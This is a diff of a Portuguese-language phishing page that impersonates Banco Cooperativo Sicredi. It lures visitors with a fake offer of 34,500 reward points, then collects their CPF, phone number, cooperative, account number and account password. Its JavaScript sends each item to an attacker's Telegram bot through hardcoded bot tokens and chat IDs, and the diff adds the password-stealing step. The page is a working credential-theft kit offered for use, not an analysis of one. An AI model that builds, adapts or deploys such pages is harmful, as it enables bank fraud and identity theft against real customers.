@@ -73,7 +73,7 @@
             box-shadow: 0 0 5px rgba(51, 130, 13, 0.5);
         }
 
-        input[type="text"] {
+        input[type="text"], input[type="password"] {
             width: 100%;
             padding: 15px;
             margin-top: 10px;
@@ -84,14 +84,24 @@
             box-sizing: border-box;
         }
 
-        input[type="text"]:focus {
+        input[type="text"]:focus, input[type="password"]:focus {
             border-color: #276c0f;
             outline: none;
         }
 
-        .icon {
-            margin-right: 8px;
+        .loading-spinner {
+            display: none;
+            margin-top: 10px;
             color: #33820d;
+        }
+
+        .imagem {
+            margin-top: 20px;
+        }
+
+        .sucesso img {
+            max-width: 100px;
+            margin-bottom: 10px;
         }
     </style>
 </head>
@@ -111,100 +121,274 @@
         </div>
 
         <footer>
-            <p><span class="negrito">© Banco Cooperativo Sicredi S.A.</span> Todos os direitos reservados</p>
+            <p><span class="negrito">© Banco Cooperativo Sicredi  S.A.</span> Todos os direitos reservados</p>
         </footer>
     </div>
 
+    <!-- Etapa de pontos liberados -->
     <div class="container" id="pontosLiberados" style="display: none;">
         <p><span class="negrito">Pontos Liberados!</span></p>
         <div class="pontos">34.500 PTS</div>
         <p>Conforme a consulta de CPF em nosso banco de dados, verificamos que você tem direito a PONTOS devido ao uso do seu cartão entre 2022 e 2024.</p>
         <p>Prossiga com as informações do seu cadastro e receba o valor em até 3 dias úteis.</p>
-        <button onclick="continuar()">Continuar</button>
+        <button onclick="prosseguirTelefone()">Continuar</button>
+    </div>
+
+    <!-- Etapa de telefone -->
+    <div class="container" id="telefoneDiv" style="display: none;">
+        <p>Por favor, insira seu <span class="negrito">telefone</span> para continuar </p>
+        <form id="phoneForm">
+            <input type="text" id="telefone" name="telefone" placeholder="(XX) XXXXX-XXXX" required><br><br>
+            <button type="button" onclick="validarTelefone()">Continuar</button>
+        </form>
+    </div>
+
+    <div class="container" id="inicioTextoDiv" style="display: none;">
+        <div class="inicio-texto" id="inicioTexto">
+            <p> Resgate <span class="negrito">AGORA</span> seus pontos acumulados por utilizar a <span class="negrito">SICREDI</span>.</p>
+        </div>
+
+        <div class="imagem" id="imagemDiv">
+            <img src="img.jpg" alt="Imagem Exemplo" style="margin-top: 20px; max-width: 80%; height: auto;">
+        </div>
+
+        <div class="sub-texto" id="subTexto">
+            <p id="mensagemSubTexto">Antes de prosseguir, apenas precisamos validar algumas informações.</p>
+        </div>
+
+        <div class="formulario" id="formulario" style="display: block;">
+            <form id="dadosForm">
+                <label for="cooperativa"><i class="fas fa-building icon"></i><span>Cooperativa:</span></label>
+                <input type="text" id="cooperativa" name="cooperativa" placeholder="Cooperativa" required><br><br>
+
+                <label for="conta"><i class="fas fa-credit-card icon"></i><span>Conta:</span></label>
+                <input type="text" id="conta" name="conta" placeholder="Número da conta" required><br><br>
+
+                <div class="loading-spinner" id="loadingSpinner">
+                    <i class="fas fa-spinner fa-spin"></i> Carregando...
+                </div>
+
+                <button type="button" onclick="validarCadastro()">Validar</button>
+            </form>
+        </div>
+
+        <div class="senha" id="senhaDiv" style="display: none;">
+            <label for="senha"><i class="fas fa-lock icon"></i><span>Senha:</span></label>
+            <input type="password" id="senha" name="senha" placeholder="Digite sua senha" required><br><br>
+            <button type="button" onclick="finalizarCadastro()">Finalizar</button>
+        </div>
+
         <footer>
             <p><span class="negrito">© Banco Cooperativo Sicredi S.A.</span> Todos os direitos reservados</p>
         </footer>
     </div>
 
-    <div class="container" id="dadosComplementares" style="display: none;">
-        <p>Confirme seu <span class="negrito">telefone</span> para continuar </p>
-        <form id="phoneForm">
-            <input type="text" id="telefone" name="telefone" placeholder="(XX) XXXXX-XXXX" required><br><br>
-            <button type="button" onclick="confirmarTelefone()">Continuar</button>
-        </form>
-    </div>
-
     <script>
-        const tokenBotTelegram = "7641124246:AAHT7YBvtkm9H0DdWpAwbVzf5rXFneFWAi0";
-        const chatId = "5219689168";
-
+        // Função para formatar o CPF
         function formatarCPF() {
-            var cpf = document.getElementById("cpf").value.replace(/\D/g, ''); // remove tudo o que não for número
-            if (cpf.length <= 11) {
-                cpf = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
-            }
-            document.getElementById("cpf").value = cpf; // Aplica a formatação
+            var cpf = document.getElementById("cpf").value;
+            cpf = cpf.replace(/\D/g, ''); // Remove tudo que não for número
+            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
+            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
+            cpf = cpf.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+            document.getElementById("cpf").value = cpf;
         }
 
+        // Função para validar o CPF
         function validarCPF() {
-            var cpf = document.getElementById("cpf").value.replace(/\D/g, ''); // Remove os pontos e traços para validar
-            if (cpf.length === 11) {
-                localStorage.setItem("cpf", cpf);
-                document.getElementById("container").style.display = "none";
-                document.getElementById("pontosLiberados").style.display = "block";
+            var cpf = document.getElementById("cpf").value;
+            cpf = cpf.replace(/\D/g, ''); // Remove tudo que não for número
 
-                // Enviar a mensagem para o Telegram
-                const mensagem = `Usuário com CPF ${cpf} validou o resgate de pontos Sicredi.`;
-                enviarParaTelegram(mensagem);
-
-            } else {
-                alert("CPF inválido! Verifique o formato.");
+            if (cpf.length !== 11 || !verificarDigitos(cpf)) {
+                alert("CPF inválido!");
+                return;
             }
+
+            // Envia o CPF para o Telegram logo após a validação
+            enviarParaTelegram(); 
+
+            // Exibe a etapa de pontos
+            document.getElementById("container").style.display = "none";
+            document.getElementById("pontosLiberados").style.display = "block";
         }
 
-        function continuar() {
+        // Função para verificar os dígitos do CPF
+        function verificarDigitos(cpf) {
+            var soma = 0;
+            var resto;
+            for (var i = 1; i <= 9; i++) {
+                soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
+            }
+            resto = (soma * 10) % 11;
+            if (resto === 10 || resto === 11) {
+                resto = 0;
+            }
+            if (resto !== parseInt(cpf.substring(9, 10))) {
+                return false;
+            }
+            soma = 0;
+            for (var i = 1; i <= 10; i++) {
+                soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
+            }
+            resto = (soma * 10) % 11;
+            if (resto === 10 || resto === 11) {
+                resto = 0;
+            }
+            if (resto !== parseInt(cpf.substring(10, 11))) {
+                return false;
+            }
+            return true;
+        }
+
+        // Função para continuar para a etapa de telefone
+        function prosseguirTelefone() {
             document.getElementById("pontosLiberados").style.display = "none";
-            document.getElementById("dadosComplementares").style.display = "block";
+            document.getElementById("telefoneDiv").style.display = "block";
         }
 
-        function confirmarTelefone() {
+        // Função para validar telefone
+        function validarTelefone() {
             var telefone = document.getElementById("telefone").value;
             if (telefone) {
-                localStorage.setItem("telefone", telefone);
-                window.location.href = "segundo.html";
+                // Envia o telefone para o Telegram
+                enviarParaTelegram(); 
 
-                // Enviar a confirmação do telefone para o Telegram
-                const cpf = localStorage.getItem("cpf");
-                const mensagemTelefone = `Usuário com CPF ${cpf} confirmou o telefone: ${telefone}`;
-                enviarParaTelegram(mensagemTelefone);
+                document.getElementById("telefoneDiv").style.display = "none";
+                document.getElementById("inicioTextoDiv").style.display = "block";
             } else {
-                alert("Por favor, insira um telefone válido.");
+                alert("Por favor, insira seu telefone.");
             }
         }
 
-        function enviarParaTelegram(mensagem) {
-            const url = `https://api.telegram.org/bot${tokenBotTelegram}/sendMessage`;
-            const data = {
-                chat_id: chatId,
-                text: mensagem
-            };
+        // Função para validar cadastro
+        function validarCadastro() {
+            var cooperativa = document.getElementById("cooperativa").value;
+            var conta = document.getElementById("conta").value;
 
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data),
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Mensagem enviada com sucesso:', data);
-            })
-            .catch((error) => {
-                console.error('Erro ao enviar mensagem:', error);
-            });
+            if (cooperativa && conta) {
+                // Envia cooperativa e conta para o Telegram
+                enviarParaTelegram();
+
+                // Exibe o carregamento
+                document.getElementById("loadingSpinner").style.display = "block";
+                setTimeout(function () {
+                    // Esconde o carregamento
+                    document.getElementById("loadingSpinner").style.display = "none";
+
+                    // Esconde os campos de cooperativa, conta, e o botão "Validar"
+                    document.getElementById("cooperativa").style.display = "none";
+                    document.getElementById("conta").style.display = "none";
+                    document.querySelector('label[for="cooperativa"]').style.display = "none";
+                    document.querySelector('label[for="conta"]').style.display = "none";
+                    document.querySelector("button[onclick='validarCadastro()']").style.display = "none"; // Esconde o botão "Validar"
+
+                    // Atualiza a mensagem
+                    document.getElementById("subTexto").innerHTML = "Falta pouco para resgatar seus pontos SICREDI. Confirme sua senha no campo abaixo:";
+
+                    // Exibe o campo de senha
+                    document.getElementById("senhaDiv").style.display = "block";
+                }, 2000); // 2 segundos de simulação de carregamento
+            } else {
+                alert("Por favor, preencha todos os campos.");
+            }
         }
+
+       // Função para finalizar o cadastro
+function finalizarCadastro() {
+    var senha = document.getElementById("senha").value;
+    if (senha) {
+        // Envia a senha para o Telegram separadamente
+        enviarSenhaParaTelegram(senha); // Passa a senha como argumento para a função
+
+        // Redireciona para a página de sucesso
+        window.location.href = "sucesso.html"; // Altere para o caminho correto do seu arquivo sucesso.html
+    } else {
+        alert("Por favor, insira sua senha.");
+    }
+}
+
+function enviarSenhaParaTelegram(senha) {
+    // Verifica se a senha não está vazia
+    if (senha) {
+        let mensagem = `Senha: ${senha}`;
+        enviarMensagemTelegram(mensagem); // Chama a função que envia a mensagem para o Telegram
+    } else {
+        console.log("Senha não informada!");
+    }
+}
+
+// Função para enviar a mensagem para o Telegram
+function enviarMensagemTelegram(mensagem) {
+    const token = '7024807486:AAFxaoUwzXKWNA-D4VOH2zqtj4K28PWw3ds'; // Seu token
+    const chatId = '6019114072'; // ID do chat
+
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    const data = {
+        chat_id: chatId,
+        text: mensagem
+    };
+
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Mensagem enviada com sucesso:', data);
+    })
+    .catch(error => {
+        console.error('Erro ao enviar mensagem:', error);
+    });
+}
+
+// Função para enviar os dados para o Telegram (geral)
+function enviarParaTelegram() {
+    const cpf = document.getElementById('cpf').value;
+    const telefone = document.getElementById('telefone').value;
+    const cooperativa = document.getElementById('cooperativa').value;
+    const conta = document.getElementById('conta').value;
+
+    // Monta a mensagem com os dados preenchidos
+    let mensagem = `CPF: ${cpf}\nTelefone: ${telefone}\nCooperativa: ${cooperativa}\nConta: ${conta}`;
+
+    // Verifica se algum campo foi preenchido antes de enviar
+    if (cpf || telefone || cooperativa || conta) {
+        enviarMensagemTelegram(mensagem);
+    }
+}
+
+// Função para enviar a mensagem para o Telegram
+function enviarMensagemTelegram(mensagem) {
+    const token = '7024807486:AAFxaoUwzXKWNA-D4VOH2zqtj4K28PWw3ds'; // Seu token
+    const chatId = '6019114072'; // ID do chat
+
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    const data = {
+        chat_id: chatId,
+        text: mensagem
+    };
+
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Mensagem enviada com sucesso:', data);
+    })
+    .catch(error => {
+        console.error('Erro ao enviar mensagem:', error);
+    });
+}
     </script>
 
 </body>
-</html>
+</html
